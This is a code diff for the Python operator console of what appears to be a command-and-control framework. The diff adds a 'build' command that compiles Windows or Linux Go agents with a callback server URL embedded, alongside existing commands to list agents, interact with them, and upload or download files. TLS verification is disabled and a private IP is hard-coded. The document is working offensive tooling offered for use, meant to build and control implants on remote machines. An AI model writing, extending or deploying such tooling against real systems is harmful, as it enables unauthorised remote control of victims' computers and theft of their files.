@@ -1,8 +1,10 @@
-import readline #for semi shell interaction in input()
+import readline #for semi shell interaction in input 
+from pathlib import Path
 import asyncio
 import json
 import websockets
 import os
+import subprocess
 import base64
 import ssl
 
@@ -23,20 +25,24 @@ BOLD = "\033[1m"
 PURPLE = "\033[38;2;128;0;255m"
 BLUE = "\033[34m"
 
+DOWNLOAD_DESTINATIONS = {}
+
+
+
 def banner():
     print(f"""{PURPLE}
 
                                                                                                       
-         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.     88 88
-        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88 88 
-       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88 88
-      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88 88
-     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88 88
-    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88 88
-   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88 88
-  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88 88
- .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88 88
-.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'     88 88
+         .8.          8 8888         8 8888  `8.`8888.      ,8'              ,o888888o.    8888 8888
+        .888.         8 8888         8 8888   `8.`8888.    ,8'              8888     `88.   88   88 
+       :88888.        8 8888         8 8888    `8.`8888.  ,8'            ,8 8888       `8.  88   88
+      . `88888.       8 8888         8 8888     `8.`8888.,8'             88 8888            88   88
+     .8. `88888.      8 8888         8 8888      `8.`88888'              88 8888            88   88
+    .8`8. `88888.     8 8888         8 8888       `8. 8888               88 8888            88   88
+   .8' `8. `88888.    8 8888         8 8888        `8 8888               88 8888            88   88
+  .8'   `8. `88888.   8 8888         8 8888         8 8888               `8 8888       .8'  88   88
+ .888888888. `88888.  8 8888         8 8888         8 8888                  8888     ,88'   88   88
+.8'       `8. `88888. 8 888888888888 8 888888888888 8 8888                   `8888888P'    8888 8888
 
 
     {RESET}""")
@@ -68,7 +74,8 @@ def all_actions(actions):
 - help
 - clear
 - build
-    ip||url /port/ windows||linux
+    use: <windows|linux> <ip|domain> <port> <http|https>
+    es. build linux 192.168.1.10 8080 https
 
 - list-agents 
 - use <agent id>
@@ -92,8 +99,6 @@ def all_actions(actions):
 
 - upload <mypath> <agentpath>
 - download  <agentpath> <mypath>
-
-- percistance 
     
 
           """)
@@ -104,9 +109,42 @@ def my_clear():
 
 def command_not_fount():
     print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
+
 #-----
 
-DOWNLOAD_DESTINATIONS = {}
+
+def compile_agent(source_file, target_os, output_name, built_server_url):
+
+    if not os.path.exists(source_file):
+        print_formatted_text(ANSI(f"[{RED}-{RESET}] src file {source_file} not found"))
+        return
+
+    print_formatted_text(ANSI(f"\n{BLUE}[*] Comipiling  os: {target_os} -  srv: {built_server_url}...{RESET}"))
+
+    try:
+        env = os.environ.copy()
+        env["GOOS"] = target_os
+        env["GOARCH"] = "amd64"
+
+        ldflags = f"-s -w -X 'main.ServerURL={built_server_url}'"
+
+        build_cmd = [
+                "go", "build",
+                "-ldflags", ldflags,
+                "-o", output_name,
+                source_file
+                ]
+
+        result = subprocess.run(build_cmd, env=env, capture_output=True, text=True)
+
+        if result.returncode == 0:
+            print_formatted_text(ANSI(f"\n{GREEN}[+] agent successfully compiled: {output_name}{RESET}\n"))
+        else:
+            print_formatted_text(ANSI(f"\n{RED}[-] Error while compiling:\n{result.stderr}{RESET}\n"))
+
+    except Exception as e:
+        print_formatted_text(ANSI(f"\n{RED}[-] exception : {e}{RESET}\n"))
+    return
 
 
 
@@ -151,7 +189,6 @@ async def event_listener(event_url):
         print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
     except Exception as e:
         print(f"\n{RED}[-] ctical error in event_listener: {e}{RESET}")
-
 
 
 
@@ -276,8 +313,6 @@ async def use_agent(websocket, agent_id, session):
                 continue
 
 
-
-
             else:
                 command_not_fount()
 
@@ -319,9 +354,6 @@ async def main(server_url, event_url):
                     elif action == "clear":
                         my_clear()
                         continue
-                    elif action == "build":
-                        print("working on")
-                        continue
 
 
 
@@ -332,6 +364,7 @@ async def main(server_url, event_url):
                         response = json.loads(await websocket.recv())
                         print(f"\nActive Agents:\n\n{response.get('agents')}\n")
                         continue
+
 
                     elif action == "use":
                         if len(parts) < 2:
@@ -344,7 +377,42 @@ async def main(server_url, event_url):
                         await use_agent(websocket, agent_id, session) 
                         continue
                     
+    
 
+
+                    elif action == "build":
+
+                        root_dir = Path(__file__).resolve().parent.parent
+
+                        linux_agent_path = root_dir / "linux_agent" / "lin_agent.go"
+                        windows_agent_path = root_dir / "windows_agent" / "win_agent.go"
+
+                        if len(parts) < 5:
+                            print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: invalid syntax."))
+                            print_formatted_text(ANSI(f"Usage: build <windows|linux> <ip> <port> <http|https>"))
+                            continue
+
+                        target_os = parts[1].lower()
+                        ip = parts[2]
+                        port = parts[3]
+                        scheme = parts[4].lower()
+
+                        if target_os not in ["windows", "linux"]:
+                            print_formatted_text(ANSI(f"[{RED}-{RESET}] OS unsupported. use 'windows' or 'linux'."))
+                            continue
+
+                        agent_http_scheme = "https" if scheme == "https" or scheme == "wss" else "http"
+                        built_server_url = f"{agent_http_scheme}://{ip}:{port}"
+
+                        if target_os == "windows":
+                            output_name = "agent_windows.exe"
+                            compile_agent(windows_agent_path, target_os, output_name,built_server_url) 
+                        else:
+                            output_name = "agent_linux"
+                            compile_agent(linux_agent_path, target_os, output_name,built_server_url)
+
+
+                    
                     else:
                         command_not_fount()
 
@@ -366,10 +434,13 @@ async def main(server_url, event_url):
 if __name__ == "__main__":
 
     #ssl context
+
+    #uncomment this if you want to use tls
     ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     ssl_context.check_hostname = False
     ssl_context.verify_mode = ssl.CERT_NONE
 
+    #change this to wss if you are using tls
     server_url = "wss://192.168.1.172:8080/ws/operator"
     events_url= "wss://192.168.1.172:8080/ws/events"
 
